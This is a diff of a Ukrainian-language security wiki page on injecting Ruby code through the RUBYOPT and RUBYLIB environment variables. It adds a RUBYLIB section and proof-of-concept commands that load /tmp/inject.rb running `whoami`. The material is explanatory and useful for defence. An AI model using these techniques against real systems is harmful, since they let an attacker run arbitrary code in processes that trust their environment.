@@ -4,7 +4,7 @@
 
 ## RUBYOPT
 
-Ruby аналізує підтримувані перемикачі командного рядка зі змінної середовища `RUBYOPT` перед запуском скрипту. Ruby відхиляє виконання коду через `-e` у `RUBYOPT`, але `-I` може додати каталог пошуку бібліотек, а `-r` може підключити бібліотеку. Таким чином, процес, який запускає Ruby з контрольованими зловмисником змінними середовища, можна змусити завантажити контрольований зловмисником Ruby-код.<sup>[[1]](#references)</sup>
+Ruby аналізує підтримувані перемикачі командного рядка зі змінної середовища `RUBYOPT` перед запуском скрипту. Ruby відхиляє виконання коду через `-e` у `RUBYOPT`, але `-I` може додати каталог пошуку бібліотек, а `-r` — підключити бібліотеку. Таким чином, процес, який запускає Ruby зі змінними середовища, контрольованими attacker'ом, можна змусити завантажити Ruby-код, контрольований attacker'ом.<sup>[[1]](#references)</sup>
 
 Створіть `/tmp/inject.rb`:
 ```ruby:inject.rb
@@ -14,7 +14,7 @@ puts `whoami`
 ```ruby:hello.rb
 puts 'Hello, World!'
 ```
-Запустіть його з контрольованим значенням `RUBYOPT`:
+Запустіть це з контрольованим значенням `RUBYOPT`:
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```
@@ -22,10 +22,17 @@ RUBYOPT="-I/tmp -rinject" ruby hello.rb
 ```bash
 RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
 ```
-Параметр, записаний після `hello.rb`, передається скрипту в `ARGV`; це не вимикає попередню обробку Ruby змінної `RUBYOPT`.<sup>[[1]](#references)</sup>
+Параметр, указаний після `hello.rb`, передається скрипту в `ARGV`; він не вимикає попередню обробку Ruby змінної `RUBYOPT`.<sup>[[1]](#references)</sup>
 ```bash
 # This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
 RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
+```
+## RUBYLIB
+
+Замість додавання директорії завантаження через `-I` у `RUBYOPT`, окрема змінна середовища `RUBYLIB` додає директорії до Ruby `$LOAD_PATH`. У поєднанні з `RUBYOPT=-r<module>` вона завантажує код attacker без потреби в `-I` у `RUBYOPT`:<sup>[[1]](#references)</sup>
+```bash
+echo "puts \`whoami\`" > /tmp/inject.rb
+RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
 ```
 ## References
 
